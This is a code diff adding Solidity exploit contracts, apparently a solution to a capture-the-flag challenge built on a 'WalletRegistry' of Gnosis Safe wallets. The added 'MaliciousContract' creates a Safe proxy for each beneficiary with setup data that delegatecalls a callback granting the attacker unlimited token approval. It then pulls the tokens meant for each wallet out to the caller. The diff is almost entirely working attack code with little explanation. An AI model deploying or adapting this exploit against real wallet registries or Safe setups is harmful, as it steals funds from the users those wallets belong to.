@@ -6,6 +6,34 @@ import "solady/src/utils/SafeTransferLib.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+import "hardhat/console.sol";
+
+// Separate contract to hold malicious callback. Can't be in the
+// Malcious Contract itself because the code won't be accessible
+// during the 'delegatecall' since the contract is still initializing. 
+contract CallBackAttack {
+    function callBack(address token, address spender) external {
+        IERC20(token).approve(spender, type(uint256).max);
+    }
+}
+
+contract MaliciousContract {
+    constructor(WalletRegistry target, address[] memory initialBeneficiaries) {
+        CallBackAttack attack = new CallBackAttack();
+
+        for (uint256 i = 0; i < initialBeneficiaries.length; ++i) {
+            bytes memory zeroBytes = new bytes(0);
+            address[] memory addressArray = new address[](1);
+            addressArray[0] = initialBeneficiaries[i];
+            bytes memory setup = abi.encodeWithSelector(GnosisSafe.setup.selector, addressArray, 1, address(attack), abi.encodeWithSelector(attack.callBack.selector, address(target.token()), address(this)), address(0), address(0),0,address(0));
+            address proxy = address(GnosisSafeProxyFactory(target.walletFactory()).createProxyWithCallback(target.masterCopy(), setup, 0, IProxyCreationCallback(target)));
+            target.token().transferFrom(proxy, msg.sender, 10 ether);
+        }
+    }
+
+}
+
 
 /**
  * @title WalletRegistry
